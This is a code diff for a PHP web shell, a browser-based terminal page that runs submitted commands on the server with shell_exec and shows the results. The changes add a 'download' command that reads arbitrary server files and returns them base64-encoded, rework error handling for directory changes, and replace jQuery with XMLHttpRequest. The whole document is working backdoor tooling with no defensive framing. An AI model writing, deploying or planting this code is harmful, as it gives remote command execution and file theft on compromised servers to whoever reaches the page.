@@ -3,6 +3,7 @@
         $username = get_current_user();
         $hostname = gethostname();
         $currentPath = getcwd();
+
         return $username . "@" . $hostname . ":" . $currentPath . "> ";
     }
 
@@ -11,21 +12,23 @@
             "promptName" => getPromptName(),
             "currentPath" => getcwd()
         );
+
         return $response;
     }
 
     function cdCommand($directory) {
-        try {
-            chdir($directory);
-            $response = null;
-        } catch(Exception $e) {
-            $response = "No such file or directory / Invalid permission";
+        if(!@chdir($directory)) {
+            $responseCommand = "No such file or directory / Invalid permission";
+        } else {
+            $responseCommand = null;
         }
+        
         $response = array(
             "promptName" => getPromptName(),
             "currentPath" => getcwd(),
-            "responseCommand" => $response
+            "responseCommand" => $responseCommand
         );
+
         return $response;
     }
 
@@ -35,6 +38,31 @@
             "currentPath" => getcwd(),
             "responseCommand" => getcwd()
         );
+
+        return $response;
+    }
+
+    function downloadCommand($filePath) {
+        if(($file = @file_get_contents($filePath)) === FALSE) {
+            $responseCommand = "No such file or directory / Invalid permission";
+
+            $response = array(
+                "promptName" => getPromptName(),
+                "currentPath" => getcwd(),
+                "responseCommand" => $responseCommand
+            );
+        } else {
+            $responseCommand = "download";
+            $fileName = basename($filePath);
+            $fileEncoded = base64_encode($file);
+            $response = array(
+                "promptName" => getPromptName(),
+                "currentPath" => getcwd(),
+                "fileName" => $fileName,
+                "file" => $fileEncoded, 
+                "responseCommand" => $responseCommand
+            );
+        }
 
         return $response;
     }
@@ -50,29 +78,26 @@
     }
 
     function shellCommand($command) {
-        $response = trim(shell_exec($command));
+        $command = preg_replace('#2>&1#', '', $command);
+        $command = escapeshellcmd($command);
+        
+        $responseCommand = trim(shell_exec($command . " 2>&1"));
+        $responseCommand = utf8_encode($responseCommand); // Converts to utf-8 for accented char, otherwise crash when sending data
+        
         $response = array(
             "promptName" => getPromptName(),
             "currentPath" => getcwd(),
-            "responseCommand" => $response 
+            "responseCommand" => $responseCommand
         );
 
         return $response;
     }
 
-    # Catch warning
-    set_error_handler(function($errno, $errstr, $errfile, $errline, $errcontext) {
-        if (0 === error_reporting()) {
-            return false;
-        }
-    
-        throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
-    });
 
     if(isset($_POST['command']) && isset($_POST['currentPath'])) {
         if(trim($_POST['command']) != "") {
-            $command = htmlentities($_POST['command']);
-            $currentPath = htmlentities($_POST['currentPath']);
+            $command = $_POST['command'];
+            $currentPath = $_POST['currentPath'];
             
             chdir($currentPath);
 
@@ -89,11 +114,16 @@
             } else if($command == "clear" || $command == "cls") {
                 $response = clearCommand();
             
+            # download COMMAND
+            } else if(preg_match("#download *#", $command)) {
+                $filePath = preg_replace('#^download *#', '$1', $command);
+                $response = downloadCommand($filePath);
+
             # SHELL COMMAND
             } else {
                 $response = shellCommand($command);
             }
-
+            
             header('content-type:application/json');
             echo json_encode($response);
             exit();
@@ -104,9 +134,7 @@
                 "promptName" => getPromptName(),
                 "currentPath" => getcwd(),
                 "responseCommand" => null 
-            );
-
-            
+            ); 
         }
         
         header('content-type:application/json');
@@ -174,6 +202,7 @@
             display:flex;
             flex-direction:row;
             justify-content:flex-start;
+            #border:1px solid #0f0f0f;
         }
         .shell-prompt {
             font-weight:bold;
@@ -246,80 +275,58 @@
             This tools was developped by Morc.
         </footer>
     </div>
-    <script
-        src="https://code.jquery.com/jquery-3.5.1.min.js"
-        integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
-        crossorigin="anonymous">
-    </script>
     <script>
-        function loadShell() {
-            document.getElementById("shellCommand").value = "";
-            $.ajax({
-                url: "",
-                method: "GET",
-                data: {
-                    start : "true",
-                },
-                cache: false,
-                beforeSend: function() {
-                    let shellPromptElt = document.getElementById("shellPrompt");
-                    shellPromptElt.textContent = "Try to connect ...";
-                },
-                success: function(response) {  
-                    let shellPromptElt = document.getElementById("shellPrompt");
-                    shellPromptElt.textContent = response.promptName;
-
-                    let shellCommandElt = document.getElementById("shellCommand");
-                    shellCommandElt.focus();
-                    getCommand(response.currentPath);
-                },
-                error: function() {
-                    let shellPromptElt = document.getElementById("shellPrompt");
-                    shellPromptElt.classList.add("error");
-                    shellPromptElt.textContent = "Error, please retry later ...";
-
-                    let shellCommandElt = document.getElementById("shellCommand");
-                    shellCommandElt.remove();
-                }  
-            });
-        }   
-
         function getCommand(currentPath) {
             document.getElementById("shellCommand").addEventListener("keypress", function(e) {
                 if (e.key === 'Enter') {
-                    $.ajax({
-                        url: "",
-                        method: "POST",
-                        cache: false,
-                        data: {
-                            currentPath : currentPath,
-                            command : document.getElementById("shellCommand").value,
-                        },
-                        beforeSend: function() {
-                            document.getElementById("shellCommand").blur();
-                        },
-                        success: function(response) {
-                            disableExCommandPrompt();
-                            if(response.responseCommand == "clear") {
-                                clearShell();
+                    let shellCommandElt = document.getElementById("shellCommand");
+                    shellCommandElt.blur();
+
+                    let xhr = new XMLHttpRequest()
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if(xhr.status === 200) {
+                                let response = JSON.parse(xhr.responseText);
+
+                                disableExCommandPrompt();
+
+                                if(response.responseCommand == "clear") {
+                                    clearShell();
+                                } else if(response.responseCommand == "download") {
+                                    downloadFile(response.fileName, response.file);
+                                } else {
+                                    writeResponseCommand(response.responseCommand);
+                                }
+
+                                updateCommandPrompt(response.promptName);
+                                getCommand(response.currentPath);
+
                             } else {
-                                writeResponseCommand(response.responseCommand)
+                                let shellPromptElt = document.getElementById("shellPrompt");
+                                shellPromptElt.classList.add("error");
+                                shellPromptElt.textContent = "Error, please retry later ...";
+                                
+                                let shellCommandElt = document.getElementById("shellCommand");
+                                shellCommandElt.remove();
                             }
-
-                            newCommandPrompt(response.promptName);
-                            getCommand(response.currentPath);
-                        },
-                        error: function() {
-                            let shellPromptElt = document.getElementById("shellPrompt");
-                            shellPromptElt.classList.add("error");
-                            shellPromptElt.textContent = "Error, please retry later ...";
-
-                            let shellCommandElt = document.getElementById("shellCommand");
-                            shellCommandElt.remove();
-                        }  
-                    });
+                        }
+                    }
+                    xhr.open('POST', '');
+                    xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded; charset=UTF-8');
+                    xhr.send("currentPath=" + encodeURIComponent(currentPath) + "&command=" + encodeURIComponent(shellCommandElt.value));
                 }
             });
+        }
+
+        function downloadFile(fileName, file) {
+            let downloadFileElt = document.createElement('a');
+            downloadFileElt.setAttribute('href', 'data:application/octet-stream;base64,' + file);
+            downloadFileElt.setAttribute('download', fileName);
+            downloadFileElt.style.display = 'none';
+            document.body.appendChild(downloadFileElt);
+            downloadFileElt.click();
+            downloadFileElt.remove();
         }
 
         function clearShell() {
@@ -345,7 +352,7 @@
             shellCommandElt.setAttribute("disabled", true);
         }
 
-        function newCommandPrompt(promptName) {
+        function updateCommandPrompt(promptName) {
             let shellCommandPrompt = document.createElement("div");
             shellCommandPrompt.id = "shellCommandPrompt";
             shellCommandPrompt.className = "shell-command_prompt";
@@ -369,7 +376,36 @@
             shellCommandElt.focus();
         }
         
-        loadShell();
+        
+        document.getElementById("shellCommand").value = "";
+        document.getElementById("shellPrompt").textContent = "Try to connect ...";
+            
+        let xhr = new XMLHttpRequest()
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if(xhr.status === 200) {
+                    let response = JSON.parse(xhr.responseText);
+
+                    let shellPromptElt = document.getElementById("shellPrompt");
+                    shellPromptElt.textContent = response.promptName;
+
+                    let shellCommandElt = document.getElementById("shellCommand");
+                    shellCommandElt.focus();
+                        
+                    getCommand(response.currentPath);
+                } else {
+                    let shellPromptElt = document.getElementById("shellPrompt");
+                    shellPromptElt.classList.add("error");
+                    shellPromptElt.textContent = "Error, please retry later ...";
+
+                    let shellCommandElt = document.getElementById("shellCommand");
+                    shellCommandElt.remove();
+                }
+            }
+        }
+        xhr.open('GET', '?start=true&_=' + new Date().getTime(), true); // Removing cache with Date().getTime()
+        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+        xhr.send();
     </script>
 </body>
 </html>
